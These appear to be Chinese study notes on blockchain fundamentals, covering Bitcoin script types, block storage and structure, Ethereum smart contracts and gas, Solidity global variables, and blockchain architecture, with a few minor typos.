#### 交易费

大多数交易包含交易费（矿工费），这是为了确保网络安全而给比特币矿工的一种补偿。费用本身也作为一个安全机制，使经济上不利于攻击者通过交易来淹没网络。

交易费作为矿工打包（挖矿）一笔交易到下一个区块中的一种激励；同时作为一种抑制因素，通过对每一笔交易收取小额费用来防止对系统的滥用。成功挖到某区块的矿工将得到该区内包含的矿工费， 并将该区块添加至区块链中。

交易费是基于交易的千字节规模来计算的，而不是比特币交易的价值。总的来说，交易费是根据比特币网络中的市场力量确定的。矿工会依据许多不同的标准对交易进行优先级排序，包括费用，他们甚至可能在某些特定情况下免费处理交易。但大多数情况下，交易费影响处理优先级，这意味着有足够费用的交易会更可能被打包进下一个挖出的区块中；反之交易费不足或者没有交易费的交易可能会被推迟，基于尽力而为的原则在几个区块之后被处理，甚至可能根本不被处理。交易费不是强制的，而且没有交易费的交易最终也可能会被处理，但是，交易费将提高处理优先级。

#### 交易脚本和脚本语言

> 比特币交易验证并不基于静态模式**，**而是通过脚本语言的执行来实现的。这种语言允许表达几乎无限的各种条件。这也是比特币作为一种“可编程的货币”所拥有的力量。

##### 图灵非完备性

比特币脚本语言包含许多操作码，但都故意限定为一种重要的模式——**除了有条件的流控制以外，没有循环或复杂流控制能力**。这样就保证了脚本语言的图灵非完备性，这意味着**脚本有限的复杂性和可预见的执行次数**。脚本并不是一种通用语言，这些限制**确保该语言不被用于创造无限循环或其它类型的逻辑炸弹**，这样的炸弹可以植入在一笔交易中，引起针对比特币网络的“拒绝服务”攻击。记住，每一笔交易都会被网络中的全节点验证，受限制的语言能防止交易验证机制被作为一个漏洞而加以利用。

##### 去中心化验证

比特币交易脚本语言是没有中心化主体的，没有任何中心主体能凌驾于脚本之上，也没有中心主体会在脚本被执行后对其进行保存。所以执行脚本所需信息都已包含在脚本中。可以预见的是，一个脚本能在任何系统上以相同的方式执行。如果您的系统验证了一个脚本，可以确信的是每一个比特币网络中的其他系统也将验证这个脚本，这意味着一个有效的交易对每个人而言都是有效的，而且每一个人都知道这一点。这种结果可预见性是比特币系统的一项至关重要的良性特征。

##### 脚本构建（锁定与解锁）

比特币的交易验证引擎依赖于两类脚本来验证比特币交易：锁定脚本和解锁脚本。

锁定脚本是一个放置在输出上面的花费条件：它指定了今后花费这笔输出必须要满足的条件。 由于锁定脚本往往含有一个公钥或比特币地址（公钥哈希值），在历史上它曾被称为脚本公钥（scriptPubKey）。

解锁脚本是一个“解决”或满足被锁定脚本在一个输出上设定的花费条件的脚本，它将允许输出被消费。解锁脚本是每一笔比特币交易输入的一部分，而且往往含有一个由用户的比特币钱包（通过用户的私钥）生成的数字签名。由于解锁脚本常常包含一个数字签名，因此它曾被称作 ScriptSig。但并非所有解锁脚本都一定会包含签名。

每一个比特币验证节点会通过同时执行锁定和解锁脚本来验证一笔交易。每个输入都包含一个解锁脚本，并引用了之前存在的 UTXO。 验证软件将复制解锁脚本，检索输入所引用的 UTXO，并从该 UTXO 复制锁定脚本。 然后依次执行解锁和锁定脚本。 如果解锁脚本满足锁定脚本条件，则输入有效。 所有输入都是独立验证的，作为交易总体验证的一部分。

##### 脚本执行堆栈

比特币的脚本语言被称为基于堆栈的语言，因为它使用一种被称为堆栈的数据结构。堆栈是一个非常简单的数据结构，可以被视为一叠卡片。栈允许两个操作：push 和pop（推送和弹出）。 Push（推送）在堆栈顶部添加一个项目。 Pop（弹出）从堆栈中删除最顶端的项。栈上的操作只能作用于栈最顶端项目。堆栈数据结构也被称为“后进先出”（ Last-In-First-Out）或 “LIFO” 队列。

脚本语言通过从左到右处理每个项目来执行脚本。数字（数据常量）被推到堆栈上。操作码（Operators）从堆栈中推送或弹出一个或多个参数，对其进行操作，并可能将结果推送到堆栈上。例如，操作码 OP_ADD 将从堆栈中弹出两个项目，添加它们，并将结果的总和推送到堆栈上。

条件操作码（Conditional operators）对一个条件进行评估，产生一个 TRUE 或 FALSE 的布尔结果（boolean result）。例如， OP_EQUAL 从堆栈中弹出两个项目，如果它们相等，则推送为 TRUE（由数字1表示），否则推送为 FALSE（由数字0表示）。比特币交易脚本通常包含条件操作码，以便它们可以产生用来表示有效交易的 TRUE 结果。

##### P2PKH（Pay-to-Public-Key-Hash）

比特币网络处理的大多数交易花费的都是由“付款至公钥哈希”（或 P2PKH）脚本锁定的输出，这些输出都含有一个锁定脚本，将输入锁定为一个公钥哈希值，即我们常说的比特币地址。由 P2PKH 脚本锁定的输出可以通过提供一个公钥和由相应私钥创建的数字签名来解锁（使用）。

例如，我们可以再次回顾一下 Alice 向 Bob 咖啡馆支付的案例。Alice 下达了向 Bob 咖啡馆的比特币地址支付0.015 比特币的支付指令，该笔交易的输出内容为以下形式的锁定脚本：

`OP_DUP OP_HASH160 <Cafe Public Key Hash> OP_EQUALVERIFY OP_CHECKSIG`

脚本中的 Cafe Public Key Hash 即为咖啡馆的比特币地址，但该地址不是基于 Base58Check 编码。事实上，大多数比特币地址的公钥哈希值都显示为十六进制码，而不是大家所熟知的以1开头的基于 Bsase58Check 编码的比特币地址。

上述锁定脚本相应的解锁脚本是：

`<Cafe Signature> <Cafe Public Key>`

将两个脚本结合起来可以形成如下组合验证脚本：

`<Cafe Signature> <Cafe Public Key> OP_DUP OP_HASH160`
`<Cafe Public Key Hash> OP_EQUALVERIFY OP_CHECKSIG`

只有当解锁版脚本与锁定版脚本的设定条件相匹配时，执行组合有效脚本时才会显示结果为真（True）。即只有当解锁脚本得到了咖啡馆的有效签名，交易执行结果才会被通过（结果为真），该有效签名是从与公钥哈希相匹配的咖啡馆的私钥中所获取的。 

![](pic/blockchain/p2pkh_1.png)

![](pic/blockchain/p2pkh_2.png)

主要验证两项，第一是 Public Key 是否能够转换成正确的地址，第二是 Signature 是否正确，也就是证明你是否是这个Public Key 的主人。 

##### P2PK（Pay-to-Public-Key）

与 P2PKH 相比，P2PK 模式更为简单。与 P2PKH 模式含有公钥哈希的模式不同，在 P2PK 脚本模式中，公钥本身已经存储在锁定脚本中，而且代码长度也更短。P2PKH 是由 Satoshi 创建的，主要目的一方面为使比特币地址更简短，另一方面也使之更方便使用。P2PK 目前在 Coinbase 交易中最为常见。

P2PK 锁定版脚本形式如下：

`<Public Key A> OP_CHECKSIG`

用于解锁的脚本是一个简单签名：

`<Signature from Private Key A>`

经由交易验证软件确认的组合脚本为：

`<Signature from Private Key A> <Public Key A> OP_CHECKSIG`

该脚本只是 CHECKSIG 操作符的简单调用，该操作主要是为了验证签名是否正确，如果正确，则返回为真（True）。

> 根据上方的规则去运行就可以发现，此规则比 P2PKH 要简单的多，只有一步验证，少了上方的地址验证。其实，P2PKH 被创建主要目的一方面为使比特币地址更简短，使之更方便使用，核心内容还是 P2PK 的。 

##### MS（Multiple Signatures）

多重签名脚本设置了这样一个条件，假如记录在脚本中的公钥个数为 N，则至少需提供其中的 M 个公钥才可以解锁。这也被称为 M-N 组合，其中，N 是记录在脚本中的公钥总个数，M 是使得多重签名生效的公钥数阀值（最少数目）。例如，对于一个 2-3 多重签名组合而言，存档公钥数为 3 个，至少同时使用其中 2 个或者 2 个以上的公钥时，才能生成激活交易的签名，通过验证后才可使用这笔资金。最初，标准多重签名脚本的最大存档公钥数被限定为 15 个，这意味着可采用 1-1 乃至15-15 的任意多重签名组合，或者组合的组合来激活交易。

通用的 M-N 多重签名锁定脚本形式为： 

`M <Public Key 1> <Public Key 2> ... <Public Key N> N OP_CHECKMULTISIG`

其中，N 是存档公钥总数，M 是要求激活交易的最少公钥数。 

2-3 多重签名条件：

`2 <Public Key A> <Public Key B> <Public Key C> 3 OP_CHECKMULTISIG`

上述锁定脚本可由含有签名和公钥的脚本予以解锁：

`OP_0 <Signature B> <Signature C>`

或者由 3 个存档公钥中的任意 2 个相一致的私钥签名组合予以解锁。

> 之所以要加上前缀 OP_0，是因为最早的 CHECKMULTISIG 在处理含有多个项目的过程中有个小漏洞，CHECKMULTISIG 会自动忽略这个前缀，它只是占位符而已。

两个脚本组合将形成一个验证脚本：

`OP_0 <Signature B> <Signature C> 2 <Public Key A> <Public Key B> <Public Key C> 3 OP_CHECKMULTISIG`

当执行时，只有当未解锁版脚本与解锁脚本设置条件相匹配时，组合脚本才显示得到结果为真（True）。上述例子中相应的设置条件即为未解锁脚本是否含有与 3 个公钥中的任意 2 个相一致的私钥的有效签名。 

##### OP_RETURN

比特币的分发和时间戳账户机制（也即区块链），其潜在运用将大大超越支付领域。许多开发者试图充分发挥交易脚本语言的安全性和可恢复性优势，将其运用于电子公证服务、证券认证和智能协议等领域。比特币脚本语言的早期运用主要包括在区块链上创造出交易输出。例如，为文件记录电子指纹，则任何人都可以通过该机制在特定的日期建立关于文档存在性的证明。

运用比特币区块链存储与比特币支付不相关数据的做法是一个有争议的话题。许多开发者认为其有滥用的嫌疑，因而试图予以阻止。另一些开发者则将之视为区块链技术强大功能的有力证明，从而试图给予大力支持。那些反对非支付相关应用的开发者认为这样做将引致“区块链膨胀”，因为所有的区块链节点都将以消耗磁盘存储空间为成本，负担存储此类数据的任务。更为严重的是，此类交易仅将比特币地址当作自由组合的 20 个字节而使用，进而会产生不能用于交易的 UTXO。因为比特币地址只是被当作数据使用，并不与私钥相匹配，所以会导致 UTXO 不能被用于交易，因而是一种伪支付行为。这样的做法将使得内存中的 UTXO 不断增加，而且这些不能被用于交易的数据同样也不能被移除，因此比特币节点将永久性地担负这些数据，这无疑是代价高昂的。

在 0.9 版的比特币核心客户端上，通过采用 OP_RETURN 操作符最终实现了妥协。OP_RETURN 允许开发者在交易输出上增加 40 字节的非交易数据。然后，与伪交易型的 UTXO 不同，OP_RETURN 创造了一种明确的可复查的非交易型输出，此类数据无需存储于 UTXO 集。OP_RETURN 输出被记录在区块链上，它们会消耗磁盘空间，也会导致区块链规模的增加，但它们不存储在 UTXO 集中，因此也不会使得 UTXO 内存膨胀，更不会以消耗代价高昂的内存为代价使全节点都不堪重负。

`OP_RETURN` 脚本的样式：

`OP_RETURN <data>`

“data”部分被限制为 40 字节，且多以哈希方式呈现，如 32 字节的 SHA256 算法输出。许多应用都在其前面加上前缀以辅助认定。例如，电子公正服务的证明材料采用 8 个字节的前缀“DOCPROOF”，在十六进制算法中，相应的 ASCII 码为`44f4350524f4f46`。

请记住`OP_RETURN` 不涉及可用于支付的解锁脚本的特点，`OP_RETURN` 不能使用其输出中所锁定的资金，因此它也就没有必要记录在蕴含潜在成本的 UTXO 集中，所以 `OP_RETURN` 实际是没有成本的。`OP_RETURN` 常为一个金额为 0 的比特币输出，因为任何与该输出相对应的比特币都会永久消失。假如一笔 `OP_RETURN` 遇到脚本验证软件，它将立即导致验证脚本和标记交易的行为无效。如果你碰巧将 `OP_RETURN` 的输出作为另一笔交易的输入，则该交易是无效的。

一笔标准交易只能有一个 `OP_RETURN` 输出，但是单个 `OP_RETURN` 输出能与任意类型的输出交易进行组合。

##### P2SH（Pay-to-Script-Hash）

P2SH 地址是基于 Base58 编码的一个含有 20 个字节哈希的脚本，就像比特币地址是基于 Base58 编码的一个含有 20 个字节的公钥。由于 P2SH 地址采用 5 作为前缀，这导致基于 Base58 编码的地址以“3”开头。以“3”为前缀给予客户这是一种特殊类型的地址的暗示，该地址与一个脚本相对应而非与一个公钥相对应，但是它的效果与比特币地址支付别无二致。

P2SH 地址隐藏了所有的复杂性，因此，运用其进行支付的人将不会看到脚本。

与直接使用复杂脚本以锁定输出的方式相比，P2SH 具有以下特点：

- 在交易输出中，复杂脚本由简短电子指纹取代，使得交易代码变短。
- 脚本能被编译为地址，支付指令的发出者和支付者的比特币钱包不需要复杂工序就可以执行 P2SH。
- P2SH 将构建脚本的重担转移至接收方，而非发送方。
- P2SH 将长脚本数据存储的负担从输出方（存储于UTXO 集，影响内存）转移至输入方（仅存储于区块链）。
- P2SH 将长脚本数据存储的重担从当前（支付时）转移至未来（花费时）。
- P2SH 将长脚本的交易费成本从发送方转移至接收方，接收方在使用该笔资金时必须含有赎回脚本。

P2SH 是 MS 多重签名的简化版本，如果使用 P2SH 进行和上方相同的 2-3 多重签名条件，步骤如下：

锁定脚本：

`2 PK1 PK2 PK3 3 OP_CHECKMULTISIG`

对锁定脚本，首先采用 SHA256 哈希算法，随后对其运用 RIPEMD160 算法，变成类似于 `8ac1d7a2fa204a16dc984fa81cfdf86a2a4e1731` 形式的 20 字节的脚本：

`<lock scriptHash>` 

于是锁定脚本变为： 

`OP_HASH160 <lock scriptHash> OP_EQUAL`

此锁定脚本要比原先使用 MS 的锁定脚本要简短的多，当接收方要使用此交易中的 UTXO 时，需要提交解锁脚本（这里又可称为赎回脚本）： 

`<Sig1> <Sig2> <2 PK1 PK2 PK3 3 OP_CHECKMULTISIG>` 

两个脚本经由两步实现组合。首先，将赎回脚本与锁定脚本比对以确认其与哈希是否匹配：

`<2 PK1 PK2 PK3 3 OP_CHECKMULTISIG> OP_HASH160 <redeem scriptHash> OP_EQUAL`

假如赎回脚本与哈希匹配，解锁脚本会被执行以释放赎回脚本：

`<Sig1> <Sig2> 2 PK1 PK2 PK3 3 OP_CHECKMULTISIG`

> 验证过程分两步，首先验证的是接收方附上的赎回脚本是否符合发送方的锁定脚本，如果是，便执行该脚本，进行多重签名的验证。

> P2SH 的特点是，将制作脚本的责任给了接收方，好处是可以暂缓节点存储的压力。

### 比特币网络

#### p2p 网络架构

#### 节点类型及分工

- 钱包
- 矿工
- 完整区块链
- 网络路由节点

### 区块链

#### 区块数据存储

There are basically four pieces of data that are maintained:

- `blocks/blk*.dat`: the actual Bitcoin blocks, in network format, dumped in raw on disk. They are only needed for rescanning missing transactions in a wallet, reorganizing to a different part of the chain, and serving the block data to other nodes that are synchronizing.
- `blocks/index/*`: this is a LevelDB database that contains metadata about all known blocks, and where to find them on disk. Without this, finding a block would be very slow.
- `chainstate/*`: this is a LevelDB database with a compact representation of all currently unspent transaction outputs and some metadata about the transactions they are from. The data here is necessary for validating new incoming blocks and transactions. It can theoretically be rebuilt from the block data (see the `-reindex` command line option), but this takes a rather long time. Without it, you could still theoretically do validation indeed, but it would mean a full scan through the blocks (140 GB as of July 2017) for every output being spent.
- `blocks/rev*.dat`: these contain "undo" data. You can see blocks as 'patches' to the chain state (they consume some unspent outputs, and produce new ones), and see the undo data as reverse patches. They are necessary for rolling back the chainstate, which is necessary in case of reorganizations.

So yes, everything but the block data itself is indeed redundant, as it can be rebuilt from it. But validation and other operations would become intolerably slow without them.

- `blocks/blk*.dat` 的文件中存储了实际的块数据，这些数据以网络格式存储。它们仅用于重新扫描钱包中丢失的交易，将这些交易重新组织到链的不同部分，并将数据块提供给其他正在同步数据的节点。
- `blocks/index/*` 是一个 LevelDB 数据库，存储着目前已知块的元数据，这些元数据记录所有已知的块以及它们存储在磁盘上的位置。没有这些文件，查找一个块将是非常慢的。
- `chainstate/*` 是一个 LevelDB 数据库，以紧凑的形式存储所有当前未花费的交易以及它们的元数据。这里的数据对于验证新传入的块和交易是必要的。在理论上，这些数据可以从块数据中重建，但是这需要很长时间。没有这些数据也可以对数据进行验证，但是需要现有块数据进行扫面，这无疑是非常慢的。
- `blocks/rev*.dat` 中包含了“撤销”数据，可以将区块视为链的“补丁”（它们消耗一些未花费的输出并生成新的输出），那么这些撤销数据将是反向补丁。如果需要回滚链，这些数据将是必须的。

> 比特币程序从网络中接受数据后，会将数据以 `.dat` 的形式转储到磁盘上。一个块文件大约为 128 MB。每个块文件会有一个对应的撤销文件，比如文件 `blocks/blk1234.dat` 和 `blocks/recv1234.dat` 对应。

#### 区块结构

区块是一种被包含在公开账簿（区块链）里的聚合了交易信息的容器数据结构。它由一个包含元数据的区块头和紧跟其后的构成区块主体的一长串交易组成。区块头是 80 字节，而平均每个交易至少是 250 字节，而且平均每个区块至少包含超过 500 个交易。因此，一个包含所有交易的完整区块比区块头的 1000 倍还要大。

| 大小             | 字段       | 描述                             |
| ---------------- | ---------- | -------------------------------- |
| 4 字节           | 区块大小   | 用字节表示的该字段之后的区块大小 |
| 80 字节          | 区块头     | 组成区块头的几个字段             |
| 1-9 （可变整数） | 交易计数器 | 交易的数量                       |
| 可变的           | 交易       | 记录在区块里的交易信息           |

#### 区块头

区块头由三组区块元数据组成。首先是一组引用父区块哈希值的数据，这组元数据用于将该区块与区块链中前一区块相连接。第二组元数据，即难度、时间戳和 nonce，与挖矿竞争相关。第三组元数据是 merkle 树根（一种用来有效地总结区块中所有交易的数据结构）。

| 大小    | 字段         | 描述                                           |
| ------- | ------------ | ---------------------------------------------- |
| 4 字节  | 版本         | 版本号，用于跟踪软件/协议的更新                |
| 32 字节 | 父区块哈希值 | 引用区块链中父区块的哈希值                     |
| 32 字节 | Merkle 根    | 该区块中交易的 merkle 树根的哈希值             |
| 4 字节  | 时间戳       | 该区块产生的近似时间（精确到秒的 Unix 时间戳） |
| 4 字节  | 难度目标     | 该区块工作量证明算法的难度目标                 |
| 4 字节  | Nonce        | 用于工作量证明算法的计数器                     |

#### 区块标识符

区块标识符：包括区块头哈希值和区块高度。

区块主标识符是它的加密哈希值，一个通过 SHA256 算法对区块头进行二次哈希计算而得到的数字指纹。产生的 32 字节哈希值被称为区块哈希值，但是更准确的名称是：区块头哈希值，因为只有区块头被用于计算。例如：000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f 是第一个比特币区块的区块哈希值。区块哈希值可以唯一、明确地标识一个区块，并且任何节点通过简单地对区块头进行哈希计算都可以独立地获取该区块哈希值。

注意：**区块哈希值实际上并不包含在区块的数据结构里**，不管是该区块在网络上传输时，抑或是它作为区块链的一部分被存储在某节点的永久性存储设备上时。相反，区块哈希值是当该区块从网络被接收时由每个节点计算出来的。**区块的哈希值可能会作为区块元数据的一部分被存储在一个独立的数据库表中，以便于索引和更快地从磁盘检索区块。**

第二种识别区块的方式是通过该区块在区块链中的位置，即“区块高度（block height）”。第一个区块，其区块高度为 0，和之前哈希值 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f 所引用的区块为同一个区块。因此，区块可以通过两种方式被识别：区块哈希值或者区块高度。每一个随后被存储在第一个区块之上的区块在区块链中都比前一区块“高”出一个位置，就像箱子一个接一个堆叠在其他箱子之上。

注意：**区块高度也不是区块数据结构的一部分**，它并不被存储在区块里。当节点接收来自比特币网络的区块时，会动态地识别该区块在区块链里的位置（区块高度）。**区块高度也可作为元数据存储在一个索引数据库表中以便快速检索。**

> 一个区块的区块哈希值总是能唯一地识别出一个特定区块。一个区块也总是有特定的区块高度。但是，一个特定的区块高度并不一定总是能唯一地识别出一个特定区块。更确切地说，两个或者更多数量的区块也许会为了区块链中的一个位置而竞争。

#### 创世区块

区块链里的第一个区块创建于 2009 年，被称为创世区块。它是区块链里面所有区块的共同祖先，这意味着你从任一区块，循链向后回溯，最终都将到达创世区块。

因为创世区块被编入到比特币客户端软件里，所以每一个节点都始于至少包含一个区块的区块链，这能确保创世区块不会被改变。每一个节点都“知道”创世区块的哈希值、结构、被创建的时间和里面的一个交易。因此，每个节点都把该区块作为区块链的首区块，从而构建了一个安全的、可信的区块链的根。

#### 区块的连接

> 区块通过引用父区块的区块头哈希值的方式，以链条的形式进行相连

比特币的完整节点保存了区块链从创世区块起的一个本地副本。随着新的区块的产生，该区块链的本地副本会不断地更新用于扩展这个链条。当一个节点从网络接收传入的区块时，它会验证这些区块，然后链接到现有的区块链上。为建立一个连接，一个节点将检查传入的区块头并寻找该区块的“父区块哈希值”。

#### Merkle 树

Merkle 树是一种哈希二叉树，它是一种用作快速归纳和校验大规模数据完整性的数据结构。这种二叉树包含加密哈希值。

在比特币网络中，Merkle 树被用来归纳一个区块中的所有交易，同时生成整个交易集合的数字指纹，且提供了一种校验区块是否存在某交易的高效途径。生成一棵完整的 Merkle 树需要递归地对哈希节点对进行哈希，并将新生成的哈希节点插入到 Merkle 树中，直到只剩一个哈希节点，该节点就是 Merkle 树的根。在比特币的 Merkle树中两次使用到了 SHA256 算法，因此其加密哈希算法也被称为 double-SHA256。

当 N 个数据元素经过加密后插入 Merkle 树时，你至多计算 2*log2(N) 次就能检查出任意某数据元素是否在该树中，这使得该数据结构非常高效。

### 挖矿与共识

## 以太坊

![](pic/blockchain/ethereum.png)

以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。以太坊通过建立终极的抽象的基础层-内置有图灵完备编程语言的区块链-使得任何人都能够创建合约和去中心化应用，并在其中设立他们自由定义的所有权规则、交易方式和状态转换函数。域名币的主体框架只需要两行代码就可以实现，诸如货币和信誉系统等其它协议只需要不到二十行代码就可以实现。智能合约-包含价值而且只有满足某些条件才能打开的加密箱子-也能在我们的平台上创建，并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量，而比比特币脚本所能提供的智能合约强大得多。

### 智能合约

#### 何为智能合约？

**以太坊上的程序称之为智能合约**， 它是代码和数据(状态)的集合。

智能合约可以理解为在区块链上可以自动执行的（由消息驱动的）、以代码形式编写的合同（特殊的交易）。

#### 编程语言：Solidity

> 智能合约编程语言有 Viper，Serpent，LLL 及 Bamboo，建议大家还是使用 Solidity。Serpent 官方已经不再推荐，建议 Serpent 的用户转换到 Viper，他们都是类 Python 语言。

智能合约的官方推荐的编程语言是 Solidity，文件扩展名以 .sol 结尾。
Solidity 语言和 JavaScript 很相似，用它来开发合约并编译成以太坊虚拟机字节代码。

#### 运行环境：EVM

EVM（Ethereum Virtual Machine）以太坊虚拟机是以太坊中智能合约的运行环境。

#### 合约的编译

以太坊虚拟机上运行的是合约的字节码形式，需要我们在部署之前先对合约进行编译，可以选择 [Browser-Solidity Web IDE ](https://ethereum.github.io/browser-solidity)或 solc 编译器。

#### 合约的部署

在以太坊上开发应用时，常常要使用到以太坊客户端（钱包）。平时我们在开发中，一般不接触到客户端或钱包的概念，它是什么呢？

##### geth

**geth**是典型的开发以太坊时使用的客户端，基于 Go 语言开发。 geth 提供了一个交互式命令控制台，通过命令控制台中包含了以太坊的各种功能（API）。

> 相对于geth，mist 则是图形化操作界面的以太坊客户端。

##### 如何部署

智能合约的部署是指把合约字节码发布到区块链上，并使用一个特定的地址来标示这个合约，这个地址称为合约账户。

> 以太坊中有两类账户：
>

- 外部账户
  该类账户被私钥控制（由人控制），没有关联任何代码。
- 合约账户
  该类账户被它们的合约代码控制且有代码与之关联。
- 外部账户与合约账户的区别和关系是这样的：一个外部账户可以通过创建和用自己的私钥来对交易进行签名，来发送消息给另一个外部账户或合约账户。
- 在两个外部账户之间传送消息是价值转移的过程。但从外部账户到合约账户的消息会激活合约账户的代码，允许它执行各种动作（比如转移代币，写入内部存储，挖出一个新代币，执行一些运算，创建一个新的合约等等）。
- 只有当外部账户发出指令时，合约账户才会执行相应的操作。

合约部署就是将编译好的合约字节码通过外部账号发送交易的形式部署到以太坊区块链上（由实际矿工出块之后，才真正部署成功）。

#### 运行

合约部署之后，当需要调用这个智能合约的方法时只需要向这个合约账户发送消息（交易）即可，通过消息触发后智能合约的代码就会在 EVM 中执行。

### Gas

以太坊上用 Gas 机制来计费，Gas 也可以认为是一个工作量单位，智能合约越复杂（计算步骤的数量和类型，占用的内存等），用来完成运行就需要越多 Gas。
任何特定的合约所需的运行合约的 Gas 数量是固定的，由合约的复杂度决定。
而 Gas 价格由运行合约的人在提交运行合约请求的时候规定，以确定他愿意为这次交易愿意付出的费用：Gas 价格（用以太币计价） * Gas数量。

Gas 的目的是限制执行交易所需的工作量，同时为执行支付费用。当 EVM 执行交易时，Gas 将按照特定规则被逐渐消耗，无论执行到什么位置，一旦 Gas 被耗尽，将会触发 `out of gas` 异常。当前调用帧所做的所有状态修改都将被回滚， 如果执行结束还有 Gas 剩余，这些 Gas 将被返还给发送账户。

> 如果没有这个限制，就会有人写出无法停止（如：死循环）的合约来阻塞网络。

因此，实际上需要一个有以太币余额的外部账户，来发起一个交易（普通交易或部署、运行一个合约），运行时，矿工收取相应的工作量费用。

### 以太坊网络

#### 使用以太坊正式网络

略。

#### 使用以太坊官网测试网络 Testnet

测试网络中，我们可以很容易获得免费的以太币，缺点是需要发很长时间初始化节点。

#### 使用私有链

创建自己的以太币私有测试网络，通常也称为私有链，我们可以用它来作为一个测试环境来开发、调试和测试智能合约。
通过 geth 很容易就可以创建一个属于自己的测试网络，以太币想挖多少挖多少，也免去了同步正式网络的整个区块链数据。

#### 使用开发者网络（模式）

相比私有链，开发者网络（模式）下，会自动分配一个有大量余额的开发者账户给我们使用。

#### 使用模拟环境

另一个创建测试网络的方法是使用 testrpc，testrpc 是在本地使用内存模拟的一个以太坊环境，对于开发调试来说，更方便快捷。而且 testrpc 可以在启动时帮我们创建 10 个存有资金的测试账户。进行合约开发时，可以在 testrpc 中测试通过后，再部署到 geth 节点中去。

## Solidity

### 单位和全局变量

#### 以太币单位

Ether 单位之间的换算就是在数字后边加上 `wei`、 `finney`、 `szabo` 或 `ether` 来实现的，如果后面没有单位，缺省为 Wei。例如 `2 ether == 2000 finney` 的逻辑判断值为 `true`

#### 时间单位

秒是缺省时间单位，在时间单位之间，数字后面带有 `seconds`、 `minutes`、 `hours`、 `days`、 `weeks` 和 `years` 的可以进行换算，基本换算关系如下：

- `1 == 1 seconds`
- `1 minutes == 60 seconds`

- `1 hours == 60 minutes`
- `1 days == 24 hours`

- `1 weeks == 7 days`

- `1 years == 365 days`

事实上，并非每年都是 365 天，由于闰秒的存在，甚至不是每天都是 24 小时。加上闰秒的不可预测性，只能借助外部系统来实现一个精确的日历库，例如 `oracle`

#### 区块和交易属性

- `block.blockhash(uint blockNumber) returns (bytes32)`：指定区块的区块哈希——仅可用于最新的 256 个区块且不包括当前区块；而 blocks 从 0.4.22 版本开始已经不推荐使用，由 `blockhash(uint blockNumber)` 代替
- `block.coinbase` (`address`): 挖出当前区块的矿工地址
- `block.difficulty` (`uint`): 当前区块难度
- `block.gaslimit` (`uint`): 当前区块 gas 限额
- `block.number` (`uint`): 当前区块号
- `block.timestamp` (`uint`): 自 unix epoch 起始当前区块以秒计的时间戳
- `gasleft() returns (uint256)`：剩余的 gas
- `msg.data` (`bytes`): 完整的 calldata
- `msg.gas` (`uint`): 剩余 gas - 自 0.4.21 版本开始已经不推荐使用，由 `gesleft()` 代替
- `msg.sender` (`address`): 消息发送者（当前调用）
- `msg.sig` (`bytes4`): calldata 的前 4 字节（也就是函数标识符）
- `msg.value` (`uint`): 随消息发送的 wei 的数量
- `now` (`uint`): 目前区块时间戳（`block.timestamp`）
- `tx.gasprice` (`uint`): 交易的 gas 价格
- `tx.origin` (`address`): 交易发起者（完全的调用链）

> 对于每一个**外部函数**调用，包括 `msg.sender` 和 `msg.value` 在内所有 `msg` 成员的值都会变化。这里包括对库函数的调用。

> 不要依赖 `block.timestamp`、 `now` 和 `blockhash` 产生随机数，除非你知道自己在做什么。
>
> 时间戳和区块哈希在一定程度上都可能受到挖矿矿工影响。例如，挖矿社区中的恶意矿工可以用某个给定的哈希来运行赌场合约的 payout 函数，而如果他们没收到钱，还可以用一个不同的哈希重新尝试。
>
> 当前区块的时间戳必须严格大于最后一个区块的时间戳，但这里唯一能确保的只是它会是在权威链上的两个连续区块的时间戳之间的数值。

> 基于可扩展因素，区块哈希不是对所有区块都有效。你仅仅可以访问最近 256 个区块的哈希，其余的哈希均为零。

#### 错误处理

- `assert(bool condition)`:

  如果条件不满足，则使当前交易没有效果 — 用于检查内部错误。

- `require(bool condition)`:

  如果条件不满足则撤销状态更改 - 用于检查由输入或者外部组件引起的错误。

- `require(bool condition, string message)`:

  如果条件不满足则撤销状态更改 - 用于检查由输入或者外部组件引起的错误，可以同时提供一个错误消息。

- `revert()`:

  终止运行并撤销状态更改。

- `revert(string reason)`:

  终止运行并撤销状态更改，可以同时提供一个解释性的字符串。

## 区块链技术

### 定义

区块链：**由使用密码学原理使之连接和保证安全的块**所组成的一个不断增长的数据记录列表。每一个区块包含一个前一个区块的密码学哈希值、一个时间戳，和交易数据。

### 分类

根据参与者的不同，可以分为公开（Public）链、联盟（Consortium）链和私有（Private）链。

公开链，顾名思义，任何人都可以参与使用和维护，典型的如比特币区块链，信息是完全公开的。

如果引入许可机制，包括私有链和联盟链两种。

私有链，则是集中管理者进行限制，只能得到内部少数人可以使用，信息不公开。

联盟链则介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是有权限的管理，相关信息会得到保护，典型如银联组织。

### 商业价值

现代商业的典型模式为，交易方通过协商和执行合约，完成交易过程。区块链擅长的正是如何管理合约，确保合约的顺利执行。根据类别和应用场景不同，区块链所体现的特点和价值也不同。

从技术特点上，区块链一般被认为具有：

- 分布式容错性：网络极其鲁棒，容错 1/3 左右节点的异常状态

- 不可篡改性：一致提交后的数据会一直存在，不可被销毁或修改

- 隐私保护性：密码学保证了未经授权者能访问到数据，但无法解析

  随之带来的业务特性将可能包括：

- 可信任性：区块链技术可以提供天然可信的分布式账本平台，不需要额外第三方中介机构

- 降低成本：跟传统技术相比，区块链技术可能带来更短的时间、更少的人力和维护成本

- 增强安全：区块链技术将有利于安全可靠的审计管理和账目清算，减少犯罪可能性，和各种风险

### 技术架构

![](pic/blockchain/blockchain_architecture.svg)

1. 数据层

数据层是最底层的技术，封装了底层区块数据的链式结构，以及数字签名、哈希函数和非对称加密技术等多种密码学算法和技术。主要实现了数据存储、账户和交易的实现与安全两个功能。

2. 网络层

网络包括 P2P 网络机制、数据传播机制和数据验证机制等，主要实现网络节点的连接和通讯。

3. 共识层

共识层主要封装网络节点的各类共识机制算法，实现全网所有节点对交易和数据达成一致，防范拜占庭攻击、女巫攻击和51% 攻击等共识攻击，其算法称为共识机制。比较常见的共识算法有工作量证明机制（PoW）、权益证明机制（PoS）、拜占庭容错算法（BFT）等。

4. 激励层

